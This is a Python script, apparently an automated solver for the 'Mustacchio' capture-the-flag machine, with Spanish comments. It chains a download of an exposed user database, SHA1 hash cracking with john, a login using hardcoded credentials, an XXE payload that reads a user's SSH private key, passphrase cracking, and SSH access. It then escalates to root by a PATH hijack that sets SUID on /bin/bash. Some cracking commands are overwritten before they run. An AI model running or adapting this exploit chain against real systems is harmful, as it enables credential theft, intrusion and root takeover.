#/usr/bin/python3

from pwn import *
import pyfiglet
import paramiko

ascii_banner = pyfiglet.figlet_format("Mustacchio")

def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))

prPurple(ascii_banner)

prYellow ("Author:")
prCyan("Johnny Chafla\n")
prYellow("Nickname:")
prCyan("jch\n")
prYellow("Site:")
prCyan("https://hacknotes.github.io/\n")

def ctrl_c(sig,frame):
	prRed ("\nSaliendo...!!\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

if len(sys.argv) < 2:
	prRed ("\nUso: python3 "+ sys.argv[0] + " <ip address>\n")
else:
	target = sys.argv[1]

	url = 'http://%s/custom/js/users.bak' %target

	# DESCARGANDO ARCHIVO
	p1 = log.progress("Descargando users.bak")
	time.sleep(2)
	p1 = log.success("Archivo descargado")
	r = requests.get(url)
	file = open("users.bak", "wb")
	file.write(r.content)
	file.close()
	# EXTRAYENDO DATOS DE USERS.BAK
	p2 = log.progress("Extrayendo datos")
	time.sleep(1)
	p2.status("sqlite3 -line users.bak 'select * from users;'")
	cmd = ("sqlite3 -line users.bak 'select * from users;' > data.txt")
	credentials = os.system(cmd)
	time.sleep(1)
	p2 = log.success("Listo")
	# EXTRAYENDO EL HASH
	p3 = log.progress("Extrayendo el hash")
	time.sleep(1)
	p3.status("cat data.txt | grep password | awk -F '=' '{print $2}' > hash.txt")
	cmd = ("cat data.txt | grep password | awk -F '=' '{print $2}' > hash.txt")
	hash = os.system(cmd)
	time.sleep(1)
	p3 = log.success("Listo")
	# ROMPIENDO EL HASH
	p4 = log.progress("Rompiendo el hash")
	time.sleep(1)
	p4.status("john -w=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 hash.txt")
	cmd = ("john -w=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 hash.txt")
	cmd = ("echo 'admin:'$(john --show --format=Raw-SHA1 hash.txt | grep '?' | awk -F ':' '{print $2}') > credentials.txt")
	time.sleep(1)
	p4 = log.success("Listo")
	password_plain_text = os.system(cmd)
	# INGRESANDO EN LA WEB
	p5 = log.progress("Ingresando al sitio web")
	time.sleep(1)
	p5.status("http://%s:8765/auth/" %target)
	url = "http://%s:8765/auth/login.php" %target
	s = requests.session()

	login_data = {
		'user':'admin',
		'pass':'bulldog19',
		'submitted':'1'
	      }

	r = s.post(url, data=login_data)
	time.sleep(1)
	p5 = log.success("Listo")
	# OBTENIENDO ID_RSA
	p6 = log.progress("Obteniendo llave id_rsa")
	time.sleep(2)
	url_login_data = "http://%s:8765/home.php" %target

	post_data = {
		'xml':'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY cmd SYSTEM "/home/barry/.ssh/id_rsa"> ]><comment><name>Johnny Chala</name><author>@jch- @hacknotes</author><com>&cmd;</com></comment>'
	       }

	r = s.post(url_login_data, data=post_data)
	file = open("id_rsa", "wb")
	file.write(r.content)
	file.close()
	os.system("cat id_rsa | grep '<br>' -A 30 | sed 's/<br>/\\n/' | grep '<h3>' -v | sed '1 s/ //' | sed 's/<p\/>//' | sed 's/<\/section>//' > id_rsa")
	p6 = log.success("Listo")
	# CONFIGURANDO ID_RSA
	p7 = log.progress("Configurando llave id_rsa")
	time.sleep(1)
	p7.status("chmod 600 id_rsa")
	os.system("chmod 600 id_rsa")
	time.sleep(1)
	p7 = log.success("Listo")
	# ROMPIENDO HASH DEL ID_RSA
	p8 = log.progress("Rompiendo el hash")
	time.sleep(1)
	p8.status("john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash")
	os.system("/usr/share/john/ssh2john.py id_rsa > id_rsa.hash")
	cmd = ("john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash")
	cmd = ("sleep 1")
	password_id_rsa = os.system(cmd)
	cmd = ("echo 'id_rsa:'$(john --show id_rsa.hash | grep 'id_rsa' | awk -F ':' '{print $2}') >> credentials.txt")
	time.sleep(1)
	password_id_rsa = os.system(cmd)
	p8 = log.success("Listo")
	# INGRESANDO AL SISTEMA POR SSH
	p9 = log.progress("Ingresando al sistema")
	time.sleep(1)
	p9.status("ssh barry@%s -i id_rsa" %target)
	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(target, username='barry', password='urieljames', key_filename='id_rsa')
	time.sleep(1)
	p9 = log.success("Listo")
	# OBTENIENDO USER.TXT
	p10 = log.progress("Obteniendo user.txt")
	stdin, stdout, stderr = ssh.exec_command('cat user.txt')
	time.sleep(1)
	p10.status("cat user.txt")
	prGreen ("\nuser.txt = " + stdout.readlines()[0])
	time.sleep(1)
	p10 = log.success("Listo")
	# ESCALANDO PRIVILEGIOS
	p11 = log.progress("Escalando privilegios")
	stdin, stdout, stderr = ssh.exec_command('echo "chmod +s /bin/bash;cat /root/root.txt" > tail')
	time.sleep(1)
	p11.status('echo "chmod +s /bin/bash;cat /root/root.txt" > tail')
	stdin, stdout, stderr = ssh.exec_command('chmod +x tail')
	time.sleep(1)
	p11.status('chmod +x tail')
	stdin, stdout, stderr = ssh.exec_command("export PATH=.:$PATH;/home/joe/live_log")
	time.sleep(1)
	p11.status("export PATH=.:$PATH;/home/joe/live_log")
	p11 = log.success("Listo")
	# ROOT.TXT
	p12 = log.progress("Obteniendo root.txt")
	time.sleep(1)
	p12.status("cat root.txt")
	prGreen ("\nroot.txt = " + stdout.readlines()[0])
	time.sleep(1)
	p12 = log.success("Listo")
	prYellow("\nAccede a %s por 'SSH' y ejecuta 'bash -p' si deseas una consola como 'root'" %target)
	ssh.close()
